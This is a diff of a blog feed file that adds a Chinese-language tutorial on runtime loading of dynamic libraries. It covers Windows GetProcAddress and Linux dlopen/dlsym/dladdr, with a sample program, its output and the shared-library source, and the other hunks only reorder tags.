+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">FARPROC WINAPI <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCSTR  lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>MSDN上的例子</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI *PGNSI)</span><span class="hljs-params">(LPSYSTEM_INFO)</span></span>;<br><span class="hljs-comment">// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.</span><br>   PGNSI pGNSI;<br>   SYSTEM_INFO si;<br>   <span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(SYSTEM_INFO));<br>   <br>   pGNSI = (PGNSI) <span class="hljs-built_in">GetProcAddress</span>(<br>      <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <br>      <span class="hljs-string">&quot;GetNativeSystemInfo&quot;</span>);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != pGNSI)<br>   &#123;<br>      <span class="hljs-built_in">pGNSI</span>(&amp;si);<br>   &#125;<br>   <span class="hljs-keyword">else</span> <br>   &#123;<br>       <span class="hljs-built_in">GetSystemInfo</span>(&amp;si);<br>   &#125;<br></code></pre></div></td></tr></table></figure>
+<p>由此可看,Windows也实现了对库文件的调用,那么Linux下怎么调用呢?<br />
+关于Linux调用库的头文件可以参考 <a href="https://linux.die.net/man/3/dlopen">https://linux.die.net/man/3/dlopen</a></p>
+<p>必须包含的头文件 <code>dlfcn.h</code><br />
+常用函数:</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//加载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> flag)</span></span>;<br><span class="hljs-comment">//返回获取的错误</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">dlerror</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-comment">//获取链接库函数地址</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *symbol)</span></span>;<br><span class="hljs-comment">//卸载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dlclose</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>注意,在编译时,要指明 <strong>-ldl</strong></p>
+<p>除此之外,还有连个也比较有用的函数<strong>dladdr() dlvsym()</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//获取函数的信息</span><br><span class="hljs-comment">//dladdr() returns 0 on error, and nonzero on success</span><br><span class="hljs-comment">//If no symbol matching addr could be found, then dli_sname and dli_saddr are set to NULL</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dladdr</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, Dl_info *info)</span></span>;<br><span class="hljs-function">The function <span class="hljs-title">dladdr</span><span class="hljs-params">()</span> takes a function pointer <span class="hljs-keyword">and</span> tries to resolve name <span class="hljs-keyword">and</span> file where it is located. Information is stored in the Dl_info structure:</span><br><span class="hljs-function">typedef struct &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_fname;  <span class="hljs-comment">/* Pathname of shared object that</span><br><span class="hljs-comment">                               contains address */</span><br>    <span class="hljs-keyword">void</span>       *dli_fbase;  <span class="hljs-comment">/* Address at which shared object</span><br><span class="hljs-comment">                               is loaded */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_sname;  <span class="hljs-comment">/* Name of nearest symbol with address</span><br><span class="hljs-comment">                               lower than addr */</span><br>    <span class="hljs-keyword">void</span>       *dli_saddr;  <span class="hljs-comment">/* Exact address of symbol named</span><br><span class="hljs-comment">                               in dli_sname */</span><br>&#125; Dl_info;<br><span class="hljs-comment">//类似dlsym()</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlvsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">char</span> *symbol, <span class="hljs-keyword">char</span> *version)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>下面以一个简单的例子说明</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span> <span class="hljs-comment">//包含的头文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB_PATH <span class="hljs-meta-string">&quot;./libtest.so&quot;</span></span><br><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*PFUN)</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    PFUN pf=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//加载链接库</span><br>    <span class="hljs-keyword">void</span> *handle=<span class="hljs-built_in">dlopen</span>(LIB_PATH,RTLD_LAZY);<br>    <span class="hljs-keyword">if</span>(handle==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load library failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//dlvsym(handle,&quot;add&quot;,&quot;1.0.0&quot;); </span><br>    <span class="hljs-comment">//获取链接库里函数地址</span><br>    <span class="hljs-comment">//方法1,参考网站上的写法</span><br>    <span class="hljs-comment">//*(void**)(&amp;pf)=dlsym(handle,&quot;add&quot;);</span><br>   <br>    <span class="hljs-comment">//方法2,相当与Windows下的 GetProcAddress() 函数.</span><br>    pf=(PFUN)<span class="hljs-built_in">dlsym</span>(handle,<span class="hljs-string">&quot;sub&quot;</span>);<br>    <span class="hljs-keyword">if</span>(pf!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-comment">//获取函数地址信息</span><br>        Dl_info info;<br>       <span class="hljs-keyword">int</span> r= <span class="hljs-built_in">dladdr</span>((<span class="hljs-keyword">void</span>*)pf,&amp;info);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;library filepath:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address1:0x%08x\n&quot;</span>\<br>                <span class="hljs-string">&quot;funciton name:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address2:0x%08x\n\n&quot;</span>,<br>                info.dli_fname,info.dli_fbase,<br>                info.dli_sname,info.dli_saddr);<br>        <span class="hljs-comment">//0 表示失败</span><br>        <span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the dl info...\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;get the function address...\n&quot;</span>);<br>        <span class="hljs-comment">//调用函数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d \n&quot;</span>,<span class="hljs-built_in">pf</span>(<span class="hljs-number">50</span>,<span class="hljs-number">15</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the function address...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//卸载链接库</span><br>    <span class="hljs-built_in">dlclose</span>(handle);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>生成:<code>g++ test.cpp -o out_test -ldl -rdynamic</code><br />
+运行<code>./out_test</code><br />
+输出结果如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">library filepath:./libtest.so<br>address1:<span class="hljs-number">0xeabfa000</span><br>funciton name:sub<br>address2:<span class="hljs-number">0xeabfa7f4</span><br>get the function address...<br>result: <span class="hljs-number">35</span><br></code></pre></div></td></tr></table></figure>
+<p>注意上面的库文件<strong><a href="http://libtest.so">libtest.so</a></strong>在当前程序目录下的,代码如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a-b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxnum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
+<p>然后 <code>g++ -fPIC -shared test.cpp -o libtest.so</code>即可生成动态链接库</p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+        <tag>Linux</tag>
+        <tag>C</tag>
       </tags>
   </entry>
   <entry>
@@ -2067,8 +2067,8 @@ depth-=10;<br />
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -2516,8 +2516,8 @@ hping3 给出了两个关键字代表多个端口。</p>
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
         <tag>C</tag>
       </tags>
   </entry>
@@ -3241,8 +3241,8 @@ $ find . -name ‘</em>’ | zenity –list –title “Search Results” –tex
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -3455,8 +3455,8 @@ font bold:400<br />
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -4628,8 +4628,8 @@ make insatll</p>
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
         <tag>C</tag>
         <tag>SDL2</tag>
       </tags>
